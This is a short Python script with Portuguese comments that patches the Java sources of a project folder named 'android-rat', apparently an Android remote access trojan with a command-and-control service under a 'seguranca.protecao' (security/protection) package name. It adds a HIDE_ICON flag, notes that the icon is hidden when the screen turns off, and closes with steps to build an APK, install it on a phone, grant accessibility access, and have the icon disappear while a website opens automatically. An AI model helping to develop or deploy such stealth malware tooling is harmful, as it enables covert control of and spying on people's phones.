"""
aplicar_patches_vps.py
======================
Aplica os patches de HIDE_ICON e WebView diretamente nos arquivos Java da VPS.
Execute este script UMA VEZ na VPS:  python aplicar_patches_vps.py
"""
import re
import sys
from pathlib import Path

# ─── Localiza o android-rat ───────────────────────────────────────────────────
def find_android_rat():
    """Procura a pasta android-rat em locais comuns."""
    script_dir = Path(__file__).resolve().parent
    candidates = [
        script_dir / "finalvnc" / "finalvnc" / "android-rat",
        script_dir.parent / "finalvnc" / "finalvnc" / "android-rat",
        Path("C:/Users/Administrador/Desktop/OOOP/finalvnc/finalvnc/android-rat"),
        Path("C:/Users/Administrador/Desktop/PROJETO23/finalvnc/finalvnc/android-rat"),
        Path("C:/Users/Administrator/Desktop/OOOP/finalvnc/finalvnc/android-rat"),
    ]
    for c in candidates:
        marker = c / "app" / "src" / "main" / "java" / "com" / "seguranca" / "protecao"
        if marker.exists():
            return marker
    return None

JAVA_DIR = find_android_rat()
if not JAVA_DIR:
    print("[ERRO] Nao encontrei a pasta android-rat.")
    print("       Execute este script de dentro da pasta OOOP.")
    sys.exit(1)

print(f"[OK] Pasta Java encontrada: {JAVA_DIR}")
print()

errors = []

# ─── Patch 1: CommandControlService.java — adiciona HIDE_ICON ────────────────
ccs_path = JAVA_DIR / "CommandControlService.java"
if not ccs_path.exists():
    errors.append(f"Nao encontrei: {ccs_path}")
else:
    content = ccs_path.read_text(encoding="utf-8")

    # Verifica se já tem HIDE_ICON
    if "HIDE_ICON" in content:
        print("[SKIP] CommandControlService.java ja tem HIDE_ICON — sem alteracao.")
    else:
        # Adiciona logo após WEBVIEW_URL
        new_content, n = re.subn(
            r'(public static final String WEBVIEW_URL\s*=\s*"[^"]*"\s*;)',
            r'\1\n    public static final boolean HIDE_ICON = false;',
            content,
            count=1,
        )
        if n == 0:
            errors.append("CommandControlService.java: nao encontrei WEBVIEW_URL para inserir HIDE_ICON")
        else:
            ccs_path.write_text(new_content, encoding="utf-8")
            print("[OK] CommandControlService.java — HIDE_ICON adicionado.")

# ─── Patch 2: SetupWizardActivity.java — chama hideAppIcon() ─────────────────
# Ocultamento imediato via SetupWizardActivity desativado. Hiding é feito via SCREEN_OFF no CommandControlService.
print("[SKIP] SetupWizardActivity.java — Patch de ocultação imediata desativado (usando SCREEN_OFF).")

# ─── Resultado ────────────────────────────────────────────────────────────────
print()
if errors:
    print("=" * 60)
    print("ERROS encontrados:")
    for e in errors:
        print(f"  - {e}")
    print("=" * 60)
    sys.exit(1)
else:
    print("=" * 60)
    print("PATCHES APLICADOS COM SUCESSO!")
    print()
    print("Agora:")
    print("  1. Feche o servidor (Ctrl+C)")
    print("  2. Abra hospedar.bat novamente")
    print("  3. Gere um APK novo com WebView URL e/ou Ocultar Icone")
    print("  4. Instale no celular e complete o setup de acessibilidade")
    print("     -> O icone vai sumir e o site vai abrir automaticamente!")
    print("=" * 60)
